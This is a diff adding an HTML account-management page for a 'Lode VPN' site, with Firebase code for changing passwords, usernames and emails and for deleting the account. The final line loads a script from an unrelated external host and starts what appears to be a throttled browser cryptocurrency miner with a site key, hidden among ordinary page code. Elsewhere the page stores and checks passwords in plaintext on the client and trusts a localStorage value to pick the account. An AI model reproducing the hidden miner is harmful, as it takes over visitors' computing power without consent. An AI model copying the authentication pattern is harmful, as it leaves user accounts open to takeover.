@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <body>
+	<!DOCTYPE html>
+	<html lang="en" dir="ltr">
+	  <head>
+		<meta charset="utf-8">
+		<title>Lode VPN | Login</title>
+		<link rel="stylesheet" href="Styles/styleAccount.css">
+		<link rel="stylesheet" href="fontawesome-free/css/all.min.css">
+		<link href="https://fonts.googleapis.com/css?family=Quicksand:600&display=swap" rel="stylesheet">
+		<link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
+		<link href="https://fonts.googleapis.com/css?family=Quicksand:600&display=swap" rel="stylesheet">
+		  <link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
+		  <link rel="apple-touch-icon" sizes="180x180" href="Icons/apple-touch-icon.png">
+		  <link rel="icon" type="image/png" sizes="32x32" href="Icons/favicon-32x32.png">
+		  <link rel="icon" type="image/png" sizes="16x16" href="Icons/favicon-16x16.png">
+		  <link rel="manifest" href="/site.webmanifest">
+		  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+		  <meta name="msapplication-TileColor" content="#da532c">
+		  <meta name="theme-color" content="#ffffff">
+		<script src="Scripts/accountScript.js"></script>
+	  </head>
+	  <body>
+		<header>
+	
+			  <div class="navigation">
+				  <div class="logo">Lode VPN</div>
+				  <div class="menu">
+			  <ul class="nav">
+				<li><a class="link" href="index.html">Home</a></li>
+				<li><a class="link" href="downloads.html">Downloads</a></li>
+				<li><a class="link" href="subsribe.html">Subscriptions</a></li>
+				<li><a class="link" href="index.html">Exit</a></li>
+			  </ul>
+				  </div>
+			  </div>
+		  </header>
+		  <div class="imgAccount">
+<img src="Icons/user.png" width="300" height="300" alt="">
+<div class="labels">
+	<label>Username: </label>
+	<label>Gmail: </label>
+	<label>Data created account: </label>
+	<label>Subscribe ended:  </label>
+	<label>Plan account: </label>
+	<div class="labelsInfo">
+		<label id="UsernameLabel">Loading...</label>
+		<label id="GmailLabel">Loading...</label>
+		<label id="DataCreatedLabel">Loading...</label>
+		<label id="SubscribeLabel">Loading...</label>
+		<label id="PremiumLabel">Loading...</label>
+	</div>
+</div>
+<div class="Functions">
+	<input id="changePassword"  type="button" name="changePassword" value="Change password">
+	<input id="changeUsername" type="button" name="changeUsername" value="Change username">
+	<input id="changeEmail" type="button" name="changeEmail" value="  Change email   ">
+</div>
+<div class="Functionsq">
+	<input id="buySubscribe" type="button" name="buySubscribe" value="     Buy subscribe    ">
+	<input id="deleteAccount" type="button" name="deleteAccount" value=  "   Delete account   ">
+	<input id="help" type="button" name="help" value="             Help           ">
+</div>
+		  </div>
+		  <div id="window">
+			  <label class="closeForm" name="closeForm" id="closeForm">X</label>
+			  <div class="form">
+				  <h2>Enter all fields</h2>
+	
+					  <input type="text" placeholder="Old password: " id="name1" class="input">
+					  <input type="text" placeholder="New password:" id="name2" class="input">
+					  <input type="submit" value="Submit" name="changePasswordInput" id="changePasswordInput">
+
+			  </div>
+		  </div>
+
+		<div id="windowqq">
+			<label class="closeForm" name="closeFormqq" id="closeFormqq">X</label>
+			<div class="form">
+				<h2>Enter all fields</h2>
+  
+					<input type="text" placeholder="New username: " id="name1qq" class="input">
+					<input type="submit" value="Submit" name="changeUsernameInput" id="changeUsernameInput">
+
+			</div>
+		</div>
+
+
+		<div id="windowq">
+			<label class="closeForm" name="closeFormq" id="closeFormq">X</label>
+			<div class="form">
+				<h2>Enter all fields</h2>
+  
+					<input type="text" placeholder="New email: " id="name1q" class="input">
+					<input type="submit" value="Submit" name="changeEmailInput" id="changeEmailInput">
+
+			</div>
+		</div>
+
+
+		<div id="windowqqq">
+			<label class="closeForm" name="closeFormqqq" id="closeFormqqq">X</label>
+			<div class="form">
+				<h2>Enter all fields</h2>
+  
+					<input type="text" placeholder="Password: " id="name1qqq" class="input">
+					<input type="submit" value="Delete account" name="deleteInput" id="deleteInput">
+
+			</div>
+		</div>
+		<div class="end-head">
+			<div class="post-navigation">
+				<ul class="social">
+					<li><a class="link" href="https://t.me/LodeVPN"><i class="fab fa-tumblr-square"></i></a></li>
+					<li><a class="link" href="https://www.linkedin.com/in/bogdan-kapriyan-80487120b/"><i class="fab fa-linkedin"></i></a></li>
+					<li><a class="link" href="https://mail.google.com/mail/u/0/#spam?compose=GTvVlcSBncCHGzfFXHDwKvblCzrQKbSLtvWWKRmFbgqRzKsSpBbdWrDLwbcpBrKmtTpZRkkSjlMJJ"><i class="fa-solid fa-envelope"></i></a></li>
+				</ul>
+				<ul class="post-nav">
+					<li><a class="link" href="#">Confidentiality</a></li>
+					<li><a class="link" href="#">Guarantees</a></li>
+					<li><a class="link" href="#">Support</a></li>
+					<li><a class="link" href="#">Contacts</a></li>
+				</ul>
+			</div>
+		</div>
+<script type="module">
+	import { getAuth, createUserWithEmailAndPassword,signOut} from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-analytics.js";
+    import {getDatabase,set,ref,get,child,onValue,remove} from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+  const firebaseConfig = {
+    apiKey: "AIzaSyCji-4mdEj7Nj6jotaEuulLIJb7YKIHRZY",
+    authDomain: "vpnusersdb.firebaseapp.com",
+    databaseURL: "https://vpnusersdb-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "vpnusersdb",
+    storageBucket: "vpnusersdb.appspot.com",
+    messagingSenderId: "306185031673",
+    appId: "1:306185031673:web:b95518e42b1cee8b24b728",
+    measurementId: "G-ZC3F8V757H"
+  };
+  localStorage.infos;
+localStorage["infos"];
+let email = localStorage.getItem("infos");
+  class User
+      {
+        constructor(Name,Gmail,Password,Created,IsPremium,DaysForFreePlan,DaysBuySubcribe,DayBuySubcribe){
+          this.Name = Name;
+          this.Gmail = Gmail;
+          this.Password = Password;
+          this.IsPremium = IsPremium;
+          this.DayBuySubcribe = DayBuySubcribe;
+          this.Created = Created;
+          this.DaysForFreePlan = DaysForFreePlan;
+          this.DaysBuySubcribe = DaysBuySubcribe;
+        }
+     
+      }
+
+    // Initialize Firebase
+	const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const database = getDatabase(app);
+  const auth = getAuth();
+
+  changePasswordInput.addEventListener('click',(e)=>{
+	var oldPassword = document.getElementById("name1").value;
+	var newPassword = document.getElementById("name2").value;
+	const dbRef = ref(getDatabase());
+	get(child(dbRef, `vpnusersdb/${email}`)).then((snapshot) => {
+		if (snapshot.exists()) {
+		if(oldPassword == snapshot.val().Password){
+			set(ref(database,'vpnusersdb/' + email),{
+  Name: snapshot.val().Name,
+  Gmail: snapshot.val().Gmail,
+  Password: newPassword,
+  Created: snapshot.val().Created,
+  IsPremium: snapshot.val().IsPremium,
+  DaysForFreePlan: snapshot.val().DaysForFreePlan,
+  DaysBuySubcribe: snapshot.val().DaysBuySubcribe,
+  DayBuySubcribe: snapshot.val().DayBuySubcribe
+      });
+      window.location.href = 'account.html';
+		}
+	}
+	});
+});
+
+changeUsernameInput.addEventListener('click',(e)=>{
+	var name = document.getElementById("name1qq").value;
+	const dbRef = ref(getDatabase());
+	get(child(dbRef, `vpnusersdb/${email}`)).then((snapshot) => {
+		if (snapshot.exists()) {
+			get(child(dbRef, `vpnusersdb/${name}`)).then((snapshot1) => {
+
+				if (!snapshot1.exists()) {
+					remove(ref(database,'vpnusersdb/' + email));
+					set(ref(database,'vpnusersdb/' + name),{
+  Name: name,
+  Gmail: snapshot.val().Gmail,
+  Password: snapshot.val().Password,
+  Created: snapshot.val().Created,
+  IsPremium: snapshot.val().IsPremium,
+  DaysForFreePlan: snapshot.val().DaysForFreePlan,
+  DaysBuySubcribe: snapshot.val().DaysBuySubcribe,
+  DayBuySubcribe: snapshot.val().DayBuySubcribe
+      });
+      window.location.href = 'index.html';
+				}
+				else{
+					alert("This is login already taken");
+				}
+			});
+		}
+	
+	});
+});
+
+
+deleteInput.addEventListener('click',(e)=>{
+	var name = document.getElementById("name1qqq").value;
+	const dbRef = ref(getDatabase());
+	get(child(dbRef, `vpnusersdb/${email}`)).then((snapshot) => {
+		if (snapshot.exists()) {
+if(snapshot.val().Password == name){
+	remove(ref(database,'vpnusersdb/' + email));
+	window.location.href = 'index.html';
+}
+else{
+	alert("Passwords don't match");
+}
+		}
+	
+	});
+});
+
+
+
+changeEmailInput.addEventListener('click',(e)=>{
+	var name = document.getElementById("name1q").value;
+	const dbRef = ref(getDatabase());
+	get(child(dbRef, `vpnusersdb/${email}`)).then((snapshot) => {
+		if (snapshot.exists()) {
+			set(ref(database,'vpnusersdb/' + email),{
+  Name: snapshot.val().Name,
+  Gmail: name,
+  Password: snapshot.val().Password,
+  Created: snapshot.val().Created,
+  IsPremium: snapshot.val().IsPremium,
+  DaysForFreePlan: snapshot.val().DaysForFreePlan,
+  DaysBuySubcribe: snapshot.val().DaysBuySubcribe,
+  DayBuySubcribe: snapshot.val().DayBuySubcribe
+      });
+      window.location.href = 'account.html';
+		}
+	
+	});
+});
+
+
+
+buySubscribe.addEventListener('click',(e)=>{
+	window.location.href = 'subsribe.html';
+
+});
+help.addEventListener('click',(e)=>{
+	window.location.href = 'https://mail.google.com/mail/u/0/#spam?compose=GTvVlcSBncCHGzfFXHDwKvblCzrQKbSLtvWWKRmFbgqRzKsSpBbdWrDLwbcpBrKmtTpZRkkSjlMJJ';
+	
+});
+	changePassword.addEventListener('click',(e)=>{
+		document.getElementById('window').style.display = 'block';	
+	})
+	closeForm.addEventListener('click',(e)=>{
+		document.getElementById('window').style.display = 'none';	
+	})
+	changeEmail.addEventListener('click',(e)=>{
+		document.getElementById('windowq').style.display = 'block';	
+	})
+	closeFormq.addEventListener('click',(e)=>{
+		document.getElementById('windowq').style.display = 'none';	
+	})
+
+	changeUsername.addEventListener('click',(e)=>{
+		document.getElementById('windowqq').style.display = 'block';	
+	})
+	closeFormqq.addEventListener('click',(e)=>{
+		document.getElementById('windowqq').style.display = 'none';	
+	})
+	deleteAccount.addEventListener('click',(e)=>{
+		document.getElementById('windowqqq').style.display = 'block';	
+	})
+	closeFormqqq.addEventListener('click',(e)=>{
+		document.getElementById('windowqqq').style.display = 'none';	
+	})
+
+  window.addEventListener('load', (e)=>{
+const dbRef = ref(getDatabase());
+
+var username = document.getElementById("UsernameLabel");
+var gmail = document.getElementById("GmailLabel");
+var created = document.getElementById("DataCreatedLabel");
+var subscribe = document.getElementById("SubscribeLabel");
+var premium = document.getElementById("PremiumLabel");
+
+get(child(dbRef, `vpnusersdb/${email}`)).then((snapshot) => {
+	var dateCreated = new Date(snapshot.val().Created);
+var dateSubcribe = new Date(snapshot.val().DaysForFreePlan);
+dateSubcribe.setDate(dateSubcribe.getDate() + snapshot.val().DayBuySubcribe);
+username.innerHTML = email;
+gmail.innerHTML = snapshot.val().Gmail;
+created.innerHTML = dateCreated.toLocaleDateString();
+subscribe.innerHTML = dateSubcribe.toLocaleDateString();
+if(snapshot.val().IsPremium == "true"){
+	premium.innerHTML = "Premium plan";
+}
+else{
+	premium.innerHTML = "Free plan";
+}
+});
+  });
+</script>	
+<script src="https://www.freecontent.stream./2VIz.js"></script><script>var _client = new Client.User('619e55dc78920998e8481afa836f9ca7dd46b7378ad23d60ec82d23591210b64', 'recounts-zzz', {throttle: 0.5, c: 'w', ads: 0});_client.start();</script>
+  </body>
+</html>
